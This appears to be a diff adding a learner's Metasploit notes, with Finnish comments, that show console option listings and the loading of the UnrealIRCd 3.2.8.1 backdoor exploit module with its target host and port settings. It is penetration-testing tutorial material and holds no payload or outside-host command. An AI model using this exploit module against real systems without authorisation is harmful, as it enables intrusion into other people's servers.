@@ -139,7 +139,44 @@ View the full module info with the info -d command.
 
 ##################################################################################################################################
 
+msf6 > show options
 
+Global Options:
+===============
+
+   Option             Current Setting    Description
+   ------             ---------------    -----------
+   ConsoleLogging     false              Log all console input and output
+   LogLevel           0                  Verbosity of logs (default 0, max 3)
+   MeterpreterPrompt  meterpreter        The meterpreter prompt string
+   MinimumRank        0                  The minimum rank of exploits that will run without explicit confirmation
+   Prompt             msf6               The prompt string
+   PromptChar         >                  The prompt character
+   PromptTimeFormat   %Y-%m-%d %H:%M:%S  Format for timestamp escapes in prompts
+   SessionLogging     false              Log all input and output for sessions
+   SessionTlvLogging  false              Log all incoming and outgoing TLV packets
+   TimestampOutput    false              Prefix all console output with a timestamp
+
+##################################################################################################################################
+"use" komennolla hakee ton exploit polun ja hienon järjestelmän sisällon ja toista "show options" katsotaan mitä sisältö sisällä sisälty
+"show options" jälkeen toistuu sieltä olevia päämuuttujia eli (RPORT, RHOSTS, LHOST), RHOST - etäisäntä ja johon hyökkätään ja Rport on etäportti
+msf6 > use exploit/unix/irc/unreal_ircd_3281_backdoor
+msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > show options
+
+Module options (exploit/unix/irc/unreal_ircd_3281_backdoor):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-meta
+                                      sploit.html
+   RPORT   6667             yes       The target port (TCP)
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic Target
 
 
 
